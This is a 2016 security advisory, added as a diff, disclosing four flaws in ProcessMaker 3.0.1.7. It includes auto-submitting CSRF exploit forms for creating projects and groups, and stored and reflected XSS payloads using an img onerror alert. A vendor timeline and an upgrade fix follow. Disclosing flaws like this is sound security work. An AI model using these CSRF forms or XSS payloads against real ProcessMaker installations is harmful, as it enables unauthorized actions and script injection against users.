@@ -1,0 +1,126 @@
+######################################################################
+# Exploit Title: ProcessMaker v3.0.1.7 Multiple vulnerabilities
+# Date: 31/05/2016
+# Author: Mickael Dorigny @ information-security.fr
+# Vendor or Software Link: http://www.processmaker.com/
+# Version: 3.0.1.7 
+# Category: Multiple Vulnerabilities
+######################################################################
+
+ProcessMaker description :
+======================================================================
+ProcessMaker Inc. is the developer of the ProcessMaker Workflow & BPM Software Suite. ProcessMaker automates form based, approval driven workflow that improves the way information flows between data and systems. ProcessMaker has been downloaded more than 750,000 times and is currently being used by thousands of companies around the world. ProcessMaker has a network of more than 35 partners located on 5 different continents.
+
+Vulnerabilities description :
+======================================================================
+ProcessMaker v3.0.1.7 is vulnerable to multiple vulnerabilities like :
+- Reflected XSS
+- Stored XSS
+- CSRF (x2)
+
+PoC n°1 -  CSRF on Designer Project Creation
+======================================================================
+Designer Project creation process is vulnerable to CSRF vulnerability. a forged request can be used to force an authentified user with designer project creation rights to create a new Designer project. 
+
+PoC: 
+
+[REQUEST]
+http://server/sysworkflow/en/neoclassic/processProxy/saveProcess?type=bpmnProject
+[POSTDATA]
+PRO_TITLE=AAA&PRO_DESCRIPTION=BBB&PRO_CATEGORY=
+
+The following HTML form can be used to exploit this CSRF vulnerability when mixed to phishing technics or auto-submit javascript tricks : 
+
+<form method=POST name=form1 action="http://serversysworkflow/en/neoclassic/processProxy/saveProcess?type=bpmnProject">
+        <input type=text name=PRO_TITLE value=XXX>
+        <input type=text name=PRO_DESCRIPTION value=XXX>
+        <input type=text name=PRO_CATEGORY value="">
+        <input type=submit>
+</form>
+<script>
+window.onload = function(){
+  document.forms['form1'].submit()
+}
+</script>
+
+Note that this CSRF vulnerability can be combined with the PoC n°3 that expose a stored XSS vulnerability in the Description input of Designer Project.
+
+Proof of Concept n°2 - CSRF on group creation
+======================================================================
+Group creation process is vulnerable to CSRF vulnerability, a forged request can be used to force an authentified user with admin rights to create a new group.
+
+PoC : 
+[REQUEST]
+http://server/sysworkflow/en/neoclassic/groups/groups_Ajax?action=saveNewGroup
+[POSTDATA]
+name=swdcs&status=1
+
+The following HTML form can be used to exploit this CSRF vulnerability when mixed to phishing technics or auto-submit javascript tricks : 
+
+<form method=POST name=form1 action="http://192.168.1.14/sysworkflow/en/neoclassic/groups/groups_Ajax?action=saveNewGroup">
+  <input type=text name=name value=2>
+  <input type=text name=status value=1>
+  <input type=submit>
+</form>
+<script>
+window.onload = function(){
+  document.forms['form1'].submit()
+}
+</script>
+
+
+Proof of Concept n°3  -  Stored XSS on Designer Project Creation
+======================================================================
+The "description" input of the designer project creation process is vulnerable to stored XSS. A user can use this input to store an XSS an make other user's browsers executes controlled JavaScript instructions.
+
+PoC
+[REQUEST]
+http://server/sysworkflow/en/neoclassic/processProxy/saveProcess?type=bpmnProject
+[POSTDATA]
+PRO_TITLE=AA<img src=x onerror=alert(1)>A&PRO_DESCRIPTION=BBB&PRO_CATEGORY=
+
+Note that this CSRF vulnerability can be combined with the PoC n°1 that expose a CSRF vulnerability in the Designer Project creation process. 
+
+Through this vulnerability, an attacker could tamper with page rendering or redirect victim to fake login page
+
+Proof of Concept n°4 - Reflected Cross-Site Scripting (RXSS) with authentication :
+======================================================================
+The search form in the Design Project can redirect user to a blank page without HTML code. This page display some information including user request. We can use this situation to execute JavaScript instruction into browser's user.
+
+Note that a search request use POST transmission method, to exploit this vulnerability, an attacker need to trap a user to visit a HTML form with auto-submit Javascript tricks to generate the forged request.
+
+PoC :
+
+[REQUEST]
+http://server/sysworkflow/en/neoclassic/processes/processesList
+[POSTDATA]
+processName=<img src=x onerror=alert(1);>&start=0&limit=25&category=%3Creset%3E
+
+Through this vulnerability, an attacker could tamper with page rendering or redirect victim to fake login page.
+
+Solution: 
+======================================================================
+
+- Update your Process Manager installation to superior version
+ 
+Additional resources :
+======================================================================
+- https://www.youtube.com/watch?v=TO2Fu-pbLI8
+- http://www.processmaker.com/
+
+Report timeline :
+======================================================================
+2016-01-26 : Editor informed for vulnerabilities
+2016-01-27 : Editor response, fixes will be part of the next release
+2016-05-25 : 3.0.1.8 is released with vulnerabilities corrections
+2016-05-31 : Advisory release
+
+Credits :
+======================================================================
+Mickael Dorigny - Security Consultant @ Synetis | Information-Security.fr
+
+My Packet Storm Security profile : https://packetstormsecurity.com/files/author/12112/
+
+--
+SYNETIS 
+CONTACT: www.synetis.com | www.information-security.fr
